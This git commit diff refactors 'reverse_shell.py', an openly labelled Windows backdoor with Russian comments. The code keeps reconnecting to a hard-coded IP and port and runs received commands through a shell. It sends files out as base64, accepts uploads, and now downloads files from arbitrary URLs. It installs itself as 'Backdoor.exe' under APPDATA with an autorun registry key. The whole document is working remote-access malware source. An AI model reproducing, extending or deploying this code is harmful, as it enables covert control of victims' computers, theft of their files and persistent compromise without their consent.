2a671b7f5a05bc2364b731f006c1feeffc0cb4eb
cy6erlem0n <dmytriy.drozd.2014@gmail.com>
2024-11-26 19:31:04 +0100

    refactroing, fixing and adding downloading file from internet

--- reverse_shell.py
+++ reverse_shell.py
@@ -8,14 +8,15 @@ import shutil
 import sys
 import winreg
 import base64 
+import requests
 
 #конвектирует данные пайтона в джейсон а его в свою очередь в байты
-def reliable_send(data):
+def reliable_send(data,sock):
         json_data = json.dumps(data).encode()
         sock.send(json_data)
 
 #отправляет большие данные по частям
-def reliable_recv():
+def reliable_recv(sock):
         json_data = b""
         while True:
                 try:
@@ -24,24 +25,22 @@ def reliable_recv():
                 except ValueError:
                         continue
 
-#повторное подключение
-def connection():
-    global sock
-    while True:
+#Скачивает файл
+def download(url):
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect(("192.168.178.67", 54321))
-            print("[+] Подключение установлено")
-            shell()
-            break  # Выход из цикла после успешного подключения
-        except socket.error:
-            print("[!] Не удалось подключиться к серверу. Повтор через 5 секунд...")
-            time.sleep(5)
+                get_response = requests.get(url)
+                file_name = url.split("/")[-1]
+                with open(file_name, "wb") as out_file:
+                        out_file.write(get_response.content)
+                return f"[+] Файл {file_name} успешно скачан!"
+        except Exception as e:
+                return f"[!!] Ошибка скачивания файла: {e}"
+        
 
 #получает файлы, команды, выполняет и потом отправляет результаты на сервер
-def shell():
+def shell(sock):
         while True:
-                command = reliable_recv()
+                command = reliable_recv(sock)
                 if command == "q":
                         break
                 elif command[:2] == "cd" and len(command) > 1:
@@ -53,36 +52,56 @@ def shell():
                 elif command[:8] == "download":
                         try:
                                 with open(command[9:], "rb") as file:
-                                        reliable_send(base64.b64encode(file.read()).decode())
+                                        reliable_send(base64.b64encode(file.read()).decode(), sock)
                         except FileNotFoundError:
-                                reliable_send("[!!] Файл не найден") 
+                                reliable_send("[!!] Файл не найден", sock) 
                 elif command[:6] == "upload":
                         with open(command[7:], "wb") as file:
-                                data = reliable_recv()
+                                data = reliable_recv(sock)
                                 try:
                                         file.write(base64.b64decode(data))
+                                        reliable_send("[+] Файл успешно загружен", sock)
                                 except:
-                                        pass
+                                        reliable_send(f"[!!] Ошибка загрузки файла: {e}", sock)
+
+                elif command[:3] == "get":
+                        result = download(command[4:])
+                        reliable_send(result, sock)
                 else:
                         try:
                                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
                                 result = proc.stdout.read() + proc.stderr.read()
-                                reliable_send(result.decode(errors="ignore"))
-                        except:
-                                reliable_send("[!!] Cant Execute That Command")
+                                reliable_send(result.decode(errors="ignore"), sock)
+                        except Exception as e:
+                                reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)
+
+#повторное подключение
+def connection():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(("192.168.178.67", 54321))
+            shell(sock)
+            sock.close()
+            break  
+        except socket.error:
+            time.sleep(5)
 
 #создание автозапуска в реестре
-location = os.environ["APPDATA"] + "\\Backdoor.exe"
-if not os.path.exists(location):
-        shutil.copyfile(sys.executable, location)
-        try:
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                        r"Software\Microsoft\Windows\CurrentVersion\Run",
-                        0, winreg.KEY_SET_VALUE) as key:
-                        winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
-        except Exception as e:
-                pass
+def setup_autorun():
+        location = os.environ["APPDATA"] + "\\Backdoor.exe"
+        if not os.path.exists(location):
+                shutil.copyfile(sys.executable, location)
+                try:
+                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                0, winreg.KEY_SET_VALUE) as key:
+                                winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
+                except Exception as e:
+                        pass
 
-sock = None
-connection()
-sock.close()
+
+if __name__ == "__main__":
+        setup_autorun()
+        connection()
+
